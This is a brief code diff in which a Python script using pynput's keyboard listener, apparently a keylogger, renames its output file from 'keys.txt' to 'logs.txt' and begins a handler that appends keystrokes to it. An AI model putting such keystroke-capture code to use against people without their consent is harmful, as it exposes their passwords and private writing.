@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Listener
 
-file_dest = "keys.txt"
+file_dest = "logs.txt"
 
 def on_press(key):
     with open(file=file_dest, mode="a") as f:
